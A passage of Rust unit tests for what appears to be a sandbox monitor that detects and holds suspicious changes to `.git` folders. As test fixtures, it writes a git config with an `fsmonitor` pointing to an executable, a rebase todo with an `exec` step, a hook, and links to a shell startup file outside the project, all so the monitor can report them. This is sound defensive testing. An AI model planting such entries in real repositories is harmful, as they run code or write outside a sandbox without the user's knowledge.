    let repos = repos(&[root.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None, "nothing there yet");
    let before = std::fs::symlink_metadata(&git).expect("git folder");
    // Git's first write: the `.git` folder is copied up.
    std::fs::write(git.join("index"), "").expect("index");
    let after = std::fs::symlink_metadata(&git).expect("git folder");
    assert!(upper.join("project/.git/index").exists(), "copied up");
    assert_eq!((before.dev(), before.ino()), (after.dev(), after.ino()));
    // What made it noise on main: the creation time moved.
    assert_ne!(
        before.created().expect("creation time"),
        after.created().expect("creation time"),
        "copy-up keeps the creation time"
    );
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(held_for(&[git]), Vec::<String>::new());
    drop(mounts);
}

/// #943 (#1502 review): past `MAX_SWAPPED` different reported swaps, every
/// `.git` folder counts as swapped (reports more, never less); a `.git` that
/// isn't a folder is neither remembered nor counted.
#[test]
fn issue_943_past_the_swapped_cap_every_git_folder_counts_as_swapped() {
    use super::unix::DotGit;
    use super::unix::Global;
    use super::unix::MAX_SWAPPED;
    let folder = |ino: u64| DotGit::Folder {
        dev: 1,
        ino,
        born: None,
    };
    let file = DotGit::File {
        dev: 1,
        ino: 0,
        born: None,
        text: None,
    };
    let mut global = Global::default();
    global.note_swapped(&file);
    assert!(!global.is_swapped(&file));
    for ino in 1..=MAX_SWAPPED as u64 {
        global.note_swapped(&folder(ino));
    }
    // Full, but a repeated report doesn't overflow it.
    global.note_swapped(&folder(1));
    let never = folder(u64::MAX);
    assert_eq!(
        (global.is_swapped(&folder(1)), global.is_swapped(&never)),
        (true, false)
    );
    global.note_swapped(&folder(MAX_SWAPPED as u64 + 1));
    assert_eq!(
        (
            global.is_swapped(&folder(1)),
            global.is_swapped(&never),
            global.is_swapped(&file),
            global.is_swapped(&DotGit::Missing),
        ),
        (true, true, false, false)
    );
}

/// #943 r8 N2: past the limit on remembered empty entries, a new empty
/// config file is reported once, not at every look, and stays held; it is
/// reported again once filled, and when made again after it went.
#[test]
fn issue_943_an_empty_config_past_the_limit_is_reported_once() {
    struct Reset;
    impl Drop for Reset {
        fn drop(&mut self) {
            super::unix::TEST_MAX_EMPTY_NEW.with(|max| max.set(None));
        }
    }
    let _reset = Reset;
    super::unix::TEST_MAX_EMPTY_NEW.with(|max| max.set(Some(0)));
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    let config = git.join("config.worktree");
    let reported = vec![format!("config {}", config.display())];
    std::fs::write(&config, "").expect("empty config");
    assert_eq!(kinds(&check(thread, &repos)), reported);
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    let (message, held) = recheck(thread, "Moderate", &[project.root.as_path()]);
    assert_eq!(
        (message, held),
        (None, shown(std::slice::from_ref(&config)))
    );
    // Made again empty before anything noticed it went: still held, not
    // told again.
    std::fs::remove_file(&config).expect("removed");
    std::fs::write(&config, "").expect("empty again");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), shown(std::slice::from_ref(&config)));
    fill(&config);
    assert_eq!(kinds(&check(thread, &repos)), reported);
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::remove_file(&config).expect("removed");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    std::fs::write(&config, "").expect("empty again");
    assert_eq!(kinds(&check(thread, &repos)), reported);
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), shown(&[config]));
}

/// #943 item 14: a command's own look (`finish`, with the git folders found
/// before it ran) after another look of this session saw its `.git`
/// replaced still reports what is new in those folders, and doesn't make the
/// next command's look report again what that look reported; what is new
/// there afterwards still is.
#[test]
fn issue_943_a_stale_finish_does_not_make_the_next_look_report_again() {
    let project = Project::new();
    let worktree_git = project.git().join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    let thread = ThreadId::new();
    let old = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &old, "Moderate"), None);
    // The command replaces the `.git` file by a folder; another command's
    // look sees it first.
    std::fs::remove_file(worktree.join(".git")).expect("removed");
    let git = worktree.join(".git");
    for folder in ["objects", "refs/heads", "hooks"] {
        std::fs::create_dir_all(git.join(folder)).expect("git folder");
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    std::fs::write(git.join("config"), "[core]\n\tfsmonitor = /tmp/run-me\n").expect("config");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    let todo = git.join("rebase-merge/git-rebase-todo");
    std::fs::write(&todo, "exec ./run-me\n").expect("todo");
    let hard = git.join("description");
    std::fs::hard_link(project.outside.join("zshrc"), &hard).expect("hard link");
    let git = git.canonicalize().expect("canonical");
    let (todo, hard) = (
        git.join("rebase-merge/git-rebase-todo"),
        git.join("description"),
    );
    let (message, _) = recheck(thread, "Moderate", &[worktree.as_path()]);
    let message = message.expect("reported");
    for path in [
        git.join("config"),
        git.join("hooks"),
        git.join("rebase-merge"),
        hard.clone(),
    ] {
        let path = path.display().to_string();
        assert!(message.contains(&path), "{path}: {message}");
    }
    // Then it plants a link in the old git folder; its own look still
    // reports it.
    let link = worktree_git.join("COMMIT_EDITMSG");
    symlink(project.outside.join("zshrc"), &link).expect("link");
    assert_eq!(
        kinds(&check(thread, &old)),
        vec![format!("link {}", link.display())]
    );
    let (message, _) = recheck(thread, "Moderate", &[worktree.as_path()]);
    assert_eq!(message, None);
    // The step emptied and the hard link removed: their holds go. Both are
    // put back the same.
    std::fs::write(&todo, "").expect("emptied");
    std::fs::remove_file(&hard).expect("unlinked");
    let (_, held) = recheck(thread, "Moderate", &[worktree.as_path()]);
    assert!(!held.contains(&todo.display().to_string()), "{held:?}");
    std::fs::write(&todo, "exec ./run-me\n").expect("todo again");
    std::fs::hard_link(project.outside.join("zshrc"), &hard).expect("hard link again");
    // The next command, with the git folders found now: those two are
    // reported (and held) again; config and hooks, still held, aren't.
    let fresh = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &fresh, "Moderate"), None);
    assert_eq!(
        kinds(&check(thread, &fresh)),
        vec![
            format!("hard link {}", hard.display()),
            format!("exec {}", todo.display()),
        ]
    );
    let held = held_for(std::slice::from_ref(&git));
    for path in shown(&[git.join("config"), git.join("hooks"), todo, hard]) {
        assert!(held.contains(&path), "{path}: {held:?}");
    }
    assert_eq!(kinds(&check(thread, &fresh)), Vec::<String>::new());
    std::fs::write(git.join("config.worktree"), "[core]\n").expect("config.worktree");
    assert_eq!(
        kinds(&check(thread, &fresh)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
}
